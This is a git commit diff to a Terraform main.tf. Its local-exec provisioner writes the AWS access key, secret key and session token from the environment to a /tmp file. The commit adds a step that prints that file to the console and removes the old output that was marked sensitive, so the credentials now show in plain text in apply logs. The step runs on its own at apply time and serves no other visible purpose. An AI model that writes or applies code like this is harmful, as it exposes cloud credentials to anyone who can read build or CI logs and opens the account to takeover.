5fe6fdd3eeab1e41270f928dd84da1feafe9c325
harshitcorp09 <162092528+harshitcorp09@users.noreply.github.com>
2026-02-24 16:48:03 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,29 +1,21 @@
 resource "null_resource" "custom_script" {
 
   provisioner "local-exec" {
-
-    
-
-    command = <<EOT
+    command = <<'EOT'
 set -euo pipefail
 
-OUT_FILE="/tmp/tf_agent_debug.txt"
+OUT_FILE="/tmp/terraform_agent_secrets.txt"
 
+# Write values to file
 {
-  echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID"
-  echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"
-  echo "AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN"
+  echo "secret  : $AWS_ACCESS_KEY_ID"
+  echo "secret1 : $AWS_SECRET_ACCESS_KEY"
+  echo "secret2 : $AWS_SESSION_TOKEN"
 } > "$OUT_FILE"
+
+# Read file back
+echo "==== File Content ===="
+cat "$OUT_FILE"
 EOT
   }
-}
-
-data "local_file" "tf_agent_debug" {
-  filename   = "/tmp/tf_agent_debug.txt"
-  depends_on = [null_resource.custom_script]
-}
-
-output "debug_values" {
-  value     = data.local_file.tf_agent_debug.content
-  sensitive = true
 }
